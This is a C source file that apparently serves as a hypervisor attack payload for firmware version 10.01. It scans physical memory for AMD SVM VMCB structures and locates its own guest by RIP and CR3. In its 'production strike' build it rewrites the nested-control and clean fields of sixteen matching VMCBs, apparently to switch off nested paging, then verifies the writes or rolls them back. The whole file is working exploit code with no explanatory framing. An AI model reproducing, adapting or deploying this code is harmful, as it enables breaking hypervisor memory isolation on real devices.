#include <stdint.h>

#define VMCB_IOPM_BASE_PA 0x40
#define VMCB_MSRPM_BASE_PA 0x48
#define VMCB_ASID          0x58
#define VMCB_NESTED_CTRL   0x90
#define VMCB_CLEAN         0xc0
#define VMCB_NESTED_CR3    0xb0
#define VMCB_CONTROL2      0xb8
#define VMCB_GUEST_CR3     0x550
#define VMCB_GUEST_RIP     0x578

#define VMCB_SCAN_LO       0x62a00000ULL
#define VMCB_SCAN_HI       0x63800000ULL
#define VMCB_SCAN_MAX      64U

#define PREFLIGHT_REACHED  0x4856503100000001ULL /* HVP1, entered */
#define PREFLIGHT_COMPLETE 0x4856503100000002ULL /* HVP1, unique 16 */
#define PREFLIGHT_REJECTED 0x4856503100000003ULL /* HVP1, fail closed */
#define STRIKE_REACHED     0x4856533100000001ULL /* HVS1, writes begin */
#define STRIKE_COMPLETE    0x4856533100000002ULL /* HVS1, 16 verified */
#define STRIKE_REJECTED    0x4856533100000003ULL /* HVS1, fail closed */

#define PARAM_STOCK_RIP    0
#define PARAM_DMAP         1
#define PARAM_RESULT       2
#define PARAM_NEEDLE_RIP   3
#define PARAM_NEEDLE_CR3   4

#ifndef read32
#define read32(p) (*(volatile uint32_t *)(uint64_t)(p))
#endif
#ifndef read64
#define read64(p) (*(volatile uint64_t *)(uint64_t)(p))
#endif
#ifndef write64
#define write64(p, v) (*(volatile uint64_t *)(uint64_t)(p) = (uint64_t)(v))
#endif
#ifndef write32
#define write32(p, v) (*(volatile uint32_t *)(uint64_t)(p) = (uint32_t)(v))
#endif

#if defined(FW_1001_PRODUCTION_STRIKE)
static __attribute__((noinline)) void vmcb_write64(uint64_t address,
                                                   uint64_t value)
{
  write64(address, value);
}

static __attribute__((noinline)) void vmcb_write32(uint64_t address,
                                                   uint32_t value)
{
  write32(address, value);
}
#endif

static int scan_pa_contains(uint64_t pa, uint64_t size)
{
  return size <= VMCB_SCAN_HI - VMCB_SCAN_LO && pa >= VMCB_SCAN_LO &&
         pa <= VMCB_SCAN_HI - size;
}

/*
 * Bounded production preflight for 10.01.
 *
 * The production build applies +0x90 and +0xc0 only after repeating every
 * validation gate. It never writes +0xb0 or +0xb8. The conditional read-only
 * form is retained so the same scanner can be exercised without VMCB stores.
 *
 * Result qwords:
 *   0 status, 1 error, 2 self count, 3 self PA, 4 self ASID,
 *   5 structural count, 6 selected count, 7 recorded count, 8 overflow,
 *   9 needle RIP, 10 needle CR3, 11 self valid, 12 self selected.
 *   13 written and 14 verified in the production build.
 *   32..48 ASID counts.
 *   64..(64+5*16): selected PA, old +0x90, proposed +0x90,
 *                   old +0xc0, proposed +0xc0.
 */
void vmcb_preflight_1001(uint64_t *param)
{
  uint64_t dmap = param[PARAM_DMAP];
  uint64_t needle_rip = param[PARAM_NEEDLE_RIP];
  uint64_t needle_cr3 = param[PARAM_NEEDLE_CR3];
  volatile uint64_t *result =
      (volatile uint64_t *)(uint64_t)param[PARAM_RESULT];
  uint16_t asid_counts[17] = {0};
  /* Every entry read below is first initialized while recorded is advanced. */
  uint64_t selected[VMCB_SCAN_MAX];
#if defined(FW_1001_PRODUCTION_STRIKE)
  /* Exact-ASID targets are kept separate from the structural scan records. */
  uint64_t targets[16];
#endif
  uint64_t self_pa = 0;
  uint64_t self_asid = 0;
  uint64_t self_count = 0;
  uint64_t self_valid = 0;
  uint64_t structural = 0;
  uint64_t recorded = 0;
  uint64_t overflow = 0;
  uint64_t selected_count = 0;
  uint64_t selected_self = 0;
  uint64_t error = 0;
#if defined(FW_1001_PRODUCTION_STRIKE)
  uint64_t written = 0;
  uint64_t verified = 0;
  uint64_t rollback_written = 0;
  uint64_t rollback_verified = 0;
#endif

  if (!result)
    return;
  write64(result + 0, PREFLIGHT_REACHED);

  if (!dmap || !needle_rip || !needle_cr3) {
    error = 1;
  } else {
    for (uint64_t pa = VMCB_SCAN_LO; pa < VMCB_SCAN_HI; pa += 0x1000) {
      uint64_t p = dmap + pa;
      uint64_t nctl = read64(p + VMCB_NESTED_CTRL);
      uint64_t control2 = read64(p + VMCB_CONTROL2);
      uint64_t ncr3 = read64(p + VMCB_NESTED_CR3);
      uint64_t iopm = read64(p + VMCB_IOPM_BASE_PA);
      uint64_t asid = read32(p + VMCB_ASID);
      uint64_t guest_cr3 = read64(p + VMCB_GUEST_CR3);
      uint64_t guest_rip = read64(p + VMCB_GUEST_RIP);

      if (guest_cr3 == needle_cr3 && guest_rip == needle_rip) {
        if (self_count++ == 0) {
          self_pa = pa;
          self_asid = asid;
          self_valid =
              nctl == 9 && control2 == 1 && asid > 0 && asid <= 16 &&
              !(ncr3 & 0xfff) && scan_pa_contains(ncr3, 0x1000) &&
              !(iopm & 0xfff) && scan_pa_contains(iopm, 0x1000);
        }
      }

      if (nctl == 9 && control2 == 1 && asid > 0 && asid <= 16 &&
          !(ncr3 & 0xfff) && scan_pa_contains(ncr3, 0x1000) &&
          !(iopm & 0xfff) && scan_pa_contains(iopm, 0x1000)) {
        structural++;
        asid_counts[asid]++;
        if (recorded < VMCB_SCAN_MAX) {
          selected[recorded++] = pa;
        } else {
          overflow++;
        }
      }
    }
  }

  if (error == 0 && self_count != 1)
    error = 2;
  if (error == 0 && !self_valid)
    error = 3;
  if (error == 0 && (overflow != 0 || recorded != structural))
    error = 4;
  if (error == 0 && asid_counts[self_asid] != 16)
    error = 5;

  if (error == 0) {
    for (uint64_t i = 0; i < recorded; ++i) {
      uint64_t pa = selected[i];
      if (read32(dmap + pa + VMCB_ASID) == self_asid) {
        uint64_t nctl = read64(dmap + pa + VMCB_NESTED_CTRL);
        uint64_t clean = read64(dmap + pa + VMCB_CLEAN);
        uint64_t out = 64 + selected_count * 5;

        if (selected_count >= 16) {
          error = 6;
          break;
        }
#if defined(FW_1001_PRODUCTION_STRIKE)
        targets[selected_count] = pa;
#endif
        write64(result + out + 0, pa);
        write64(result + out + 1, nctl);
        write64(result + out + 2, nctl & ~1ULL);
        write64(result + out + 3, clean);
        write64(result + out + 4, 0);
        if (pa == self_pa)
          selected_self++;
        selected_count++;
      }
    }
    if (selected_count != 16 || selected_self != 1)
      error = 7;
  }

#if defined(FW_1001_PRODUCTION_STRIKE)
  /*
   * Revalidate all sixteen pages before the first VMCB store.
   */
  if (error == 0) {
    for (uint64_t i = 0; i < 16; ++i) {
      uint64_t pa = targets[i];
      uint64_t p = dmap + pa;
      uint64_t nctl = read64(p + VMCB_NESTED_CTRL);
      uint64_t control2 = read64(p + VMCB_CONTROL2);
      uint64_t ncr3 = read64(p + VMCB_NESTED_CR3);
      uint64_t iopm = read64(p + VMCB_IOPM_BASE_PA);
      uint64_t asid = read32(p + VMCB_ASID);

      if (nctl != 9 || control2 != 1 || asid != self_asid ||
          (ncr3 & 0xfff) || !scan_pa_contains(ncr3, 0x1000) ||
          (iopm & 0xfff) || !scan_pa_contains(iopm, 0x1000)) {
        error = 8;
        break;
      }
    }
  }
  if (error == 0) {
    /* Publish the complete immutable target record before the first store. */
    write64(result + 1, 0);
    write64(result + 2, self_count);
    write64(result + 3, self_pa);
    write64(result + 4, self_asid);
    write64(result + 5, structural);
    write64(result + 6, selected_count);
    write64(result + 7, recorded);
    write64(result + 8, overflow);
    write64(result + 9, needle_rip);
    write64(result + 10, needle_cr3);
    write64(result + 11, self_valid);
    write64(result + 12, selected_self);
    for (uint32_t asid = 0; asid <= 16; ++asid)
      write64(result + 32 + asid, asid_counts[asid]);
    __asm__ volatile("mfence" ::: "memory");
    write64(result + 0, STRIKE_REACHED);
    __asm__ volatile("mfence" ::: "memory");
    for (uint64_t i = 0; i < 16; ++i) {
      uint64_t pa = targets[i];
      uint64_t p = dmap + pa;
      vmcb_write64(p + VMCB_NESTED_CTRL,
                   read64(p + VMCB_NESTED_CTRL) & ~1ULL);
      vmcb_write32(p + VMCB_CLEAN, 0);
      written++;
    }
    __asm__ volatile("mfence" ::: "memory");
    for (uint64_t i = 0; i < 16; ++i) {
      uint64_t pa = targets[i];
      uint64_t p = dmap + pa;
      if (read64(p + VMCB_NESTED_CTRL) == 8 &&
          read32(p + VMCB_CLEAN) == 0)
        verified++;
    }
    if (written != 16 || verified != 16)
      error = 9;
  }
  if (error == 9) {
    /* A non-terminal strike restores both touched fields before rejection. */
    for (uint64_t i = written; i != 0; --i) {
      uint64_t n = i - 1;
      uint64_t pa = targets[n];
      uint64_t p = dmap + pa;
      uint64_t out = 64 + n * 5;
      vmcb_write64(p + VMCB_NESTED_CTRL, read64(result + out + 1));
      vmcb_write32(p + VMCB_CLEAN,
                   (uint32_t)read64(result + out + 3));
      rollback_written++;
    }
    __asm__ volatile("mfence" ::: "memory");
    for (uint64_t i = 0; i < 16; ++i) {
      uint64_t pa = targets[i];
      uint64_t p = dmap + pa;
      uint64_t out = 64 + i * 5;
      if (read64(p + VMCB_NESTED_CTRL) == read64(result + out + 1) &&
          read32(p + VMCB_CLEAN) ==
              (uint32_t)read64(result + out + 3))
        rollback_verified++;
    }
    if (rollback_verified != 16)
      error = 10;
  }
#endif

  write64(result + 1, error);
  write64(result + 2, self_count);
  write64(result + 3, self_pa);
  write64(result + 4, self_asid);
  write64(result + 5, structural);
  write64(result + 6, selected_count);
  write64(result + 7, recorded);
  write64(result + 8, overflow);
  write64(result + 9, needle_rip);
  write64(result + 10, needle_cr3);
  write64(result + 11, self_valid);
  write64(result + 12, selected_self);
#if defined(FW_1001_PRODUCTION_STRIKE)
  write64(result + 13, written);
  write64(result + 14, verified);
  write64(result + 15, rollback_written);
  write64(result + 16, rollback_verified);
#endif
  for (uint32_t asid = 0; asid <= 16; ++asid)
    write64(result + 32 + asid, asid_counts[asid]);

  __asm__ volatile("mfence" ::: "memory");
#if defined(FW_1001_PRODUCTION_STRIKE)
  write64(result + 0, error == 0 ? STRIKE_COMPLETE : STRIKE_REJECTED);
#else
  write64(result + 0,
          error == 0 ? PREFLIGHT_COMPLETE : PREFLIGHT_REJECTED);
#endif
}
